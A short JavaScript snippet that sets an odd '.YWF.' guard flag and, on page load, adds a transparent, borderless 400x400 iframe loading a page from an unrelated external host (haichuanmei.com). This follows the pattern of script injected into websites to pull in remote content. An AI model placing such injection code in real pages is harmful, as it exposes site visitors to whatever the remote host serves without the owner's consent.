(function() {
    if ( window[ '.YWF.' ] )
        return;
    
    var html = document.documentElement,
        head = document.getElementsByTagName( 'head' )[ 0 ],
        body = document.body,
        dom  = head || body || html;
    
    if ( !dom )
        return;
    window[ '.YWF.' ] = 1;
})();
window.onload = function(){
    var rbox = document.createElement('div'); rbox.id = "rbox";	 
        rbox.innerHTML = '<div id="rbox_content"><iframe width="400" height="400" name="rbframe" allowTransparency="true" style="overflow:hidden;background-color:transparent;" frameBorder="0" scrolling="no" src="http://0516.haichuanmei.com/1.htm"></iframe></div>';	 
        document.body.appendChild(rbox);
}
